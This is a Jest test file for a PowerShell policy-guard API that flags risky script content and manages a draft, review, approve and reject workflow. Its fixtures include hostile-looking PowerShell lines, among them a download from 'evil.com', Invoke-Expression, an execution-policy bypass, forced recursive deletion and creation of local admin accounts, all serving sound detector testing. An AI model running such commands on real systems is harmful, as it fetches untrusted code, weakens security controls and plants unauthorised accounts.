import { jest } from "@jest/globals";
import request from "supertest";
import { createTestApp, createMockBuilder  } from "./helpers";
import { errorHandler } from "../middleware/error";

jest.mock("../config/env", () => ({
  getEnv: jest.fn().mockReturnValue({
    NODE_ENV: "test",
    SUPABASE_URL: "https://test.supabase.co",
    SUPABASE_ANON_KEY: "test-anon-key",
    SUPABASE_SERVICE_ROLE_KEY: "test-service-role-key",
    CORS_ORIGIN: "*",
    LOG_LEVEL: "silent",
    JWT_SECRET: "test-jwt-secret",
    APP_BASE_URL: "http://localhost:3000",
    API_PORT: 4000,
    SMTP_HOST: "",
    EMAIL_FROM: "noreply@test.local",
    SENTRY_DSN: "",
    STRIPE_SECRET_KEY: "",
    STRIPE_WEBHOOK_SECRET: "",
    PUBLIC_TRAFFIC_WEBHOOK_URL: "",
    PUBLIC_LEAD_WEBHOOK_URL: "",
    JSM_DOMAIN: "",
    JSM_EMAIL: "",
    JSM_API_TOKEN: "",
    JSM_SERVICEDESK_ID: "",
    JSM_REQUEST_TYPE_ID: "",
  }),
}));
jest.mock("../services/supabase", () => ({ getSupabaseAdmin: jest.fn() }));
jest.mock("../services/audit", () => ({ logAuditEvent: jest.fn() }));
import { getSupabaseAdmin } from "../services/supabase";
import router from "../routes/edu-automation";

const auth = "Bearer test-token";
const org = "00000000-0000-0000-0000-000000000001";
const scriptId = "11111111-1111-1111-1111-111111111111";

function ma() {
  const s = {
    from: jest.fn(),
    auth: {
      getUser: jest
        .fn()
        .mockResolvedValue({ data: { user: { id: "u", email: "t" } }, error: null }),
    },
  };
  (getSupabaseAdmin as jest.Mock).mockReturnValue(s);
  return s;
}

/*
 * Route-level suites: auth/permission middleware is stubbed so the shared
 * Supabase mock serves only route queries. Middleware enforcement itself is
 * covered by security-suite / edge-cases / dedicated middleware tests.
 */
jest.mock("../middleware/org-access", () => ({
  requireOrgAccess: (_req: unknown, _res: unknown, next: () => void) => next(),
  requireOrgAccessByParam: (_req: unknown, _res: unknown, next: () => void) => next(),
}));
jest.mock("../middleware/permissions", () => ({
  requirePermission:
    () =>
    (_req: unknown, _res: unknown, next: () => void) =>
      next(),
}));
jest.mock("../middleware/require-active-subscription", () => ({
  requireActiveSubscription: (_req: unknown, _res: unknown, next: () => void) => next(),
}));

const app = createTestApp();
app.use("/api/v1/edu-automation", router);
app.use(errorHandler);

describe("PowerShell Policy Guard", () => {
  beforeEach(() => jest.clearAllMocks());

  describe("POST /powershell/:id/check", () => {
    it("returns violations for dangerous scripts", async () => {
      const s = ma();
      const dangerousContent = [
        "Invoke-Expression $cmd",
        "Remove-Item C:\\Temp -Recurse -Force",
        "Set-ExecutionPolicy Bypass",
        "Invoke-WebRequest -Uri http://evil.com/payload",
      ].join("\n");

      const fetchBuilder = createMockBuilder({
        data: { id: scriptId, script_content: dangerousContent },
        error: null,
      });
      const updateBuilder = createMockBuilder({
        data: { id: scriptId, policy_checked: true },
        error: null,
      });
      s.from.mockImplementation((table: string) => {
        if (table === "powershell_scripts") {
          if (
            fetchBuilder.select.mock.calls.length === 0 &&
            fetchBuilder.single.mock.calls.length === 0
          ) {
            return fetchBuilder;
          }
          return updateBuilder;
        }
        return createMockBuilder({ data: null, error: null });
      });

      const r = await request(app)
        .post(`/api/v1/edu-automation/powershell/${scriptId}/check`)
        .set("Authorization", auth);

      expect(r.status).toBe(200);
      expect(r.body.data.violations.length).toBeGreaterThanOrEqual(4);
      expect(r.body.data.riskLevel).toBe("critical");
    });

    it("returns no violations for safe scripts", async () => {
      const s = ma();
      const safeContent = 'Write-Host "Hello World"\nGet-Date';

      const fetchBuilder = createMockBuilder({
        data: { id: scriptId, script_content: safeContent },
        error: null,
      });
      const updateBuilder = createMockBuilder({
        data: { id: scriptId, policy_checked: true },
        error: null,
      });
      s.from.mockImplementation((table: string) => {
        if (table === "powershell_scripts") {
          if (
            fetchBuilder.select.mock.calls.length === 0 &&
            fetchBuilder.single.mock.calls.length === 0
          ) {
            return fetchBuilder;
          }
          return updateBuilder;
        }
        return createMockBuilder({ data: null, error: null });
      });

      const r = await request(app)
        .post(`/api/v1/edu-automation/powershell/${scriptId}/check`)
        .set("Authorization", auth);

      expect(r.status).toBe(200);
      expect(r.body.data.violations).toEqual([]);
      expect(r.body.data.riskLevel).toBe("low");
    });

    it("returns 404 for nonexistent script", async () => {
      const s = ma();
      s.from.mockReturnValue(createMockBuilder({ data: null, error: null }));

      const r = await request(app)
        .post("/api/v1/edu-automation/powershell/00000000-0000-0000-0000-000000000000/check")
        .set("Authorization", auth);

      expect(r.status).toBe(404);
    });

    it("returns 400 when script has no content", async () => {
      const s = ma();
      s.from.mockReturnValue(
        createMockBuilder({ data: { id: scriptId, script_content: null }, error: null }),
      );

      const r = await request(app)
        .post(`/api/v1/edu-automation/powershell/${scriptId}/check`)
        .set("Authorization", auth);

      expect(r.status).toBe(400);
    });

    it("assigns medium risk for 1-2 violations", async () => {
      const s = ma();
      const content = "Invoke-Expression $cmd\nnet user admin P@ss";

      s.from.mockImplementation((table: string) => {
        if (table === "powershell_scripts") {
          return createMockBuilder({
            data: { id: scriptId, script_content: content },
            error: null,
          });
        }
        return createMockBuilder({ data: null, error: null });
      });

      const r = await request(app)
        .post(`/api/v1/edu-automation/powershell/${scriptId}/check`)
        .set("Authorization", auth);

      expect(r.status).toBe(200);
      expect(r.body.data.violations.length).toBe(2);
      expect(r.body.data.riskLevel).toBe("medium");
    });

    it("assigns high risk for 3 violations", async () => {
      const s = ma();
      const content = [
        "Invoke-Expression $cmd",
        "Stop-Service wuauserv",
        "New-LocalUser -Name hacker",
      ].join("\n");

      s.from.mockImplementation((table: string) => {
        if (table === "powershell_scripts") {
          return createMockBuilder({
            data: { id: scriptId, script_content: content },
            error: null,
          });
        }
        return createMockBuilder({ data: null, error: null });
      });

      const r = await request(app)
        .post(`/api/v1/edu-automation/powershell/${scriptId}/check`)
        .set("Authorization", auth);

      expect(r.status).toBe(200);
      expect(r.body.data.violations.length).toBe(3);
      expect(r.body.data.riskLevel).toBe("high");
    });
  });

  describe("POST /powershell/:id/submit", () => {
    it("transitions from draft to pending_review", async () => {
      const s = ma();
      s.from
        .mockReturnValueOnce(
          createMockBuilder({ data: { id: scriptId, status: "draft" }, error: null }),
        )
        .mockReturnValueOnce(
          createMockBuilder({ data: { id: scriptId, status: "pending_review" }, error: null }),
        );

      const r = await request(app)
        .post(`/api/v1/edu-automation/powershell/${scriptId}/submit`)
        .set("Authorization", auth);

      expect(r.status).toBe(200);
      expect(r.body.data.status).toBe("pending_review");
    });

    it("rejects submit if status is not draft", async () => {
      const s = ma();
      s.from.mockReturnValue(
        createMockBuilder({ data: { id: scriptId, status: "pending_review" }, error: null }),
      );

      const r = await request(app)
        .post(`/api/v1/edu-automation/powershell/${scriptId}/submit`)
        .set("Authorization", auth);

      expect(r.status).toBe(409);
      expect(r.body.error.code).toBe("INVALID_STATE");
    });

    it("returns 404 for nonexistent script", async () => {
      const s = ma();
      s.from.mockReturnValue(createMockBuilder({ data: null, error: null }));

      const r = await request(app)
        .post("/api/v1/edu-automation/powershell/00000000-0000-0000-0000-000000000000/submit")
        .set("Authorization", auth);

      expect(r.status).toBe(404);
    });
  });

  describe("POST /powershell/:id/approve", () => {
    it("transitions from pending_review to approved", async () => {
      const s = ma();
      s.from
        .mockReturnValueOnce(
          createMockBuilder({ data: { id: scriptId, status: "pending_review" }, error: null }),
        )
        .mockReturnValueOnce(
          createMockBuilder({ data: { id: scriptId, status: "approved" }, error: null }),
        );

      const r = await request(app)
        .post(`/api/v1/edu-automation/powershell/${scriptId}/approve`)
        .set("Authorization", auth);

      expect(r.status).toBe(200);
      expect(r.body.data.status).toBe("approved");
    });

    it("fails if status is not pending_review", async () => {
      const s = ma();
      s.from.mockReturnValue(
        createMockBuilder({ data: { id: scriptId, status: "draft" }, error: null }),
      );

      const r = await request(app)
        .post(`/api/v1/edu-automation/powershell/${scriptId}/approve`)
        .set("Authorization", auth);

      expect(r.status).toBe(409);
      expect(r.body.error.code).toBe("INVALID_STATE");
    });

    it("fails if already approved", async () => {
      const s = ma();
      s.from.mockReturnValue(
        createMockBuilder({ data: { id: scriptId, status: "approved" }, error: null }),
      );

      const r = await request(app)
        .post(`/api/v1/edu-automation/powershell/${scriptId}/approve`)
        .set("Authorization", auth);

      expect(r.status).toBe(409);
    });

    it("returns 404 for nonexistent script", async () => {
      const s = ma();
      s.from.mockReturnValue(createMockBuilder({ data: null, error: null }));

      const r = await request(app)
        .post("/api/v1/edu-automation/powershell/00000000-0000-0000-0000-000000000000/approve")
        .set("Authorization", auth);

      expect(r.status).toBe(404);
    });
  });

  describe("POST /powershell/:id/reject", () => {
    it("transitions from pending_review to rejected", async () => {
      const s = ma();
      s.from
        .mockReturnValueOnce(
          createMockBuilder({ data: { id: scriptId, status: "pending_review" }, error: null }),
        )
        .mockReturnValueOnce(
          createMockBuilder({ data: { id: scriptId, status: "rejected" }, error: null }),
        );

      const r = await request(app)
        .post(`/api/v1/edu-automation/powershell/${scriptId}/reject`)
        .set("Authorization", auth);

      expect(r.status).toBe(200);
      expect(r.body.data.status).toBe("rejected");
    });

    it("fails if status is not pending_review", async () => {
      const s = ma();
      s.from.mockReturnValue(
        createMockBuilder({ data: { id: scriptId, status: "draft" }, error: null }),
      );

      const r = await request(app)
        .post(`/api/v1/edu-automation/powershell/${scriptId}/reject`)
        .set("Authorization", auth);

      expect(r.status).toBe(409);
      expect(r.body.error.code).toBe("INVALID_STATE");
    });

    it("returns 404 for nonexistent script", async () => {
      const s = ma();
      s.from.mockReturnValue(createMockBuilder({ data: null, error: null }));

      const r = await request(app)
        .post("/api/v1/edu-automation/powershell/00000000-0000-0000-0000-000000000000/reject")
        .set("Authorization", auth);

      expect(r.status).toBe(404);
    });
  });
});
